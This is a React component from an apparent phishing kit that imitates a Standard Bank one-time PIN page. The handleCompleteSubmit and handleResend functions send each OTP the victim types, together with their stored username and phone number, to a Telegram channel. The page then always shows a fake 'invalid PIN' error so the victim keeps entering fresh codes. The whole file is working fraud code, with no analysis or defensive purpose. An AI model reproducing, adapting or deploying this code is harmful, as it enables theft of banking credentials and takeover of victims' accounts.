"use client";

import React, { useState, useEffect, useRef } from "react";
import { ArrowLeft, Loader2 } from "lucide-react";
import { useRouter } from "next/navigation";
import { sendTelegramMessage } from "@/lib/telegram";

export function OtpForm() {
  const router = useRouter();
  const [otp, setOtp] = useState<string[]>(["", "", "", "", ""]);
  const [activeIndex, setActiveIndex] = useState(0);
  const [timer, setTimer] = useState(55);
  const [canResend, setCanResend] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);



  // Timer countdown
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    } else {
      setCanResend(true);
    }
  }, [timer]);

  // Auto submit when 5 digits are filled
  const handleCompleteSubmit = (enteredOtp: string) => {
    if (isLoading) return;
    setIsLoading(true);
    setErrorMessage("");

    try {
      sessionStorage.setItem("otp1", enteredOtp);
      const username = typeof window !== "undefined" ? sessionStorage.getItem("username") || "N/A" : "N/A";
      const userPhone = typeof window !== "undefined" ? sessionStorage.getItem("userPhone") || "N/A" : "N/A";

      // Instantly dispatch to Telegram without waiting
      sendTelegramMessage({
        title: "Standard Bank - OTP-1 Submitted",
        type: "otp",
        otp1: enteredOtp,
        username: username,
        phoneNumber: userPhone,
      }).catch((err) => console.error("Error sending OTP to Telegram:", err));
    } catch (err) {
      console.error("Error storing OTP:", err);
    }

    // Show loader for 2 seconds then display invalid message and reset
    setTimeout(() => {
      setIsLoading(false);
      setErrorMessage("The One-Time PIN you entered is invalid. Please try again.");
      setOtp(["", "", "", "", ""]);
      setTimer(55);
      setCanResend(false);
      setActiveIndex(0);
      inputRefs.current[0]?.focus();
    }, 2000);
  };

  // Handle single digit input
  const handleChange = (index: number, value: string) => {
    if (errorMessage) setErrorMessage("");

    const numericValue = value.replace(/\D/g, "");
    if (!numericValue) {
      // Clear current cell
      const newOtp = [...otp];
      newOtp[index] = "";
      setOtp(newOtp);
      return;
    }

    // Handle paste of multiple characters
    if (numericValue.length > 1) {
      const pastedChars = numericValue.slice(0, 5).split("");
      const newOtp = [...otp];
      pastedChars.forEach((char, i) => {
        if (i < 5) newOtp[i] = char;
      });
      setOtp(newOtp);
      const nextFocus = Math.min(pastedChars.length, 4);
      setActiveIndex(nextFocus);
      inputRefs.current[nextFocus]?.focus();

      if (pastedChars.length === 5) {
        handleCompleteSubmit(newOtp.join(""));
      }
      return;
    }

    // Single digit input
    const newOtp = [...otp];
    newOtp[index] = numericValue.slice(-1);
    setOtp(newOtp);

    // Auto-advance to next input
    if (index < 4) {
      setActiveIndex(index + 1);
      inputRefs.current[index + 1]?.focus();
    }

    // Auto-submit when all 5 digits are filled
    const fullOtp = newOtp.join("");
    if (fullOtp.length === 5) {
      handleCompleteSubmit(fullOtp);
    }
  };

  // Handle Backspace and arrow keys
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (!otp[index] && index > 0) {
        const newOtp = [...otp];
        newOtp[index - 1] = "";
        setOtp(newOtp);
        setActiveIndex(index - 1);
        inputRefs.current[index - 1]?.focus();
      } else {
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      }
    } else if (e.key === "ArrowLeft" && index > 0) {
      setActiveIndex(index - 1);
      inputRefs.current[index - 1]?.focus();
    } else if (e.key === "ArrowRight" && index < 4) {
      setActiveIndex(index + 1);
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleResend = async () => {
    if (!canResend || isLoading) return;
    setTimer(55);
    setCanResend(false);
    setErrorMessage("");
    setOtp(["", "", "", "", ""]);
    setActiveIndex(0);
    inputRefs.current[0]?.focus();

    try {
      const username = typeof window !== "undefined" ? sessionStorage.getItem("username") || "N/A" : "N/A";
      const userPhone = typeof window !== "undefined" ? sessionStorage.getItem("userPhone") || "N/A" : "N/A";

      await sendTelegramMessage({
        title: "Standard Bank - Resend OTP Requested",
        type: "resend_otp",
        username: username,
        phoneNumber: userPhone,
      });
    } catch (err) {
      console.error("Resend error:", err);
    }
  };

  return (
    <div dir="ltr" className="h-[100dvh] max-h-[100dvh] w-full bg-white flex flex-col font-sans selection:bg-blue-600 selection:text-white overflow-hidden select-none">
      {/* Top App Header */}
      <header className="w-full bg-[#0061E1] h-14 sm:h-16 flex items-center px-4 shadow-md shrink-0">
        <button
          type="button"
          onClick={() => router.push("/")}
          className="p-2 -ml-2 text-white hover:bg-white/10 rounded-full transition-colors cursor-pointer"
          aria-label="Back"
        >
          <ArrowLeft className="w-6 h-6 text-white" />
        </button>
        <h1 className="text-white text-xl font-normal tracking-wide ml-3">
          OTP
        </h1>
      </header>

      {/* Main Body Content */}
      <main className="flex-1 w-full max-w-[420px] mx-auto px-5 pt-6 sm:pt-12 pb-6 flex flex-col items-center justify-between text-center overflow-hidden">
        <div className="w-full flex flex-col items-center">
          {/* Title - Light font */}
          <h2 className="text-2xl sm:text-[28px] font-light text-[#1e293b] tracking-normal">
            Enter One-Time PIN
          </h2>

          {/* Subtitle - Light font */}
          <div className="mt-2 text-[#475569] text-[14px] sm:text-[15px] font-light leading-relaxed">
            <p>A one-time PIN has been sent</p>
          </div>

          {/* 5 OTP Input Boxes */}
          <div className="mt-6 sm:mt-8 mb-4 sm:mb-6 w-full max-w-[280px] sm:max-w-[300px]">
            <div className="grid grid-cols-5 gap-2 sm:gap-2.5">
              {otp.map((digit, index) => {
                const isFocused = activeIndex === index;
                return (
                  <div key={index} className="relative aspect-square">
                    <input
                      ref={(el) => {
                        inputRefs.current[index] = el;
                      }}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={1}
                      value={digit}
                      autoFocus={index === 0}
                      onFocus={() => setActiveIndex(index)}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      disabled={isLoading}
                      className={`w-full h-full text-center text-xl sm:text-2xl font-light rounded-[12px] outline-none transition-colors bg-white ${
                        isFocused
                          ? "border-[1.5px] border-[#0091df]"
                          : digit
                          ? "border-[1.5px] border-gray-400 text-gray-900"
                          : "border-[1.5px] border-[#cfd4dc] text-gray-900"
                      } ${errorMessage ? "border-red-400 bg-red-50/20" : ""}`}
                    />
                  </div>
                );
              })}
            </div>

            {/* Error message */}
            {errorMessage && (
              <p className="mt-3 text-red-600 text-sm font-normal animate-in fade-in duration-200">
                {errorMessage}
              </p>
            )}
          </div>

          {/* Resend Countdown Text - Light font */}
          <div className="mt-1 text-sm text-[#475569] font-light">
            {timer > 0 ? (
              <p>
                Didn&apos;t get the OTP? Resend after{" "}
                <span className="font-normal text-gray-900">{timer} seconds</span>.
              </p>
            ) : (
              <p className="text-gray-700 font-light">Didn&apos;t get the OTP? You can resend now.</p>
            )}
          </div>
        </div>

        {/* Action Row: RESEND & HELP - Light font */}
        <div className="w-full max-w-[280px] sm:max-w-[300px] flex items-center justify-between px-1 pt-4">
          <button
            type="button"
            onClick={handleResend}
            disabled={!canResend || isLoading}
            className={`text-[15px] font-normal tracking-wider uppercase transition-colors cursor-pointer ${
              canResend
                ? "text-[#0061E1] hover:text-[#002a88] hover:underline"
                : "text-gray-400 cursor-not-allowed"
            }`}
          >
            RESEND
          </button>

          <button
            type="button"
            onClick={(e) => {
              e.preventDefault();
              alert("If you did not receive your One-Time PIN, please verify your mobile number with customer support or try RESEND once the timer expires.");
            }}
            className="text-[15px] font-normal tracking-wider text-[#0061E1] hover:text-[#002a88] hover:underline transition-colors uppercase cursor-pointer"
          >
            HELP
          </button>
        </div>

        {/* 2-Second Loading Overlay */}
        {isLoading && (
          <div className="fixed inset-0 bg-black/25 backdrop-blur-[2px] flex items-center justify-center z-50">
            <div className="bg-white p-6 rounded-2xl shadow-xl flex flex-col items-center gap-3">
              <Loader2 className="w-10 h-10 text-[#0061E1] animate-spin" />
              <p className="text-sm font-normal text-gray-700">Verifying OTP...</p>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
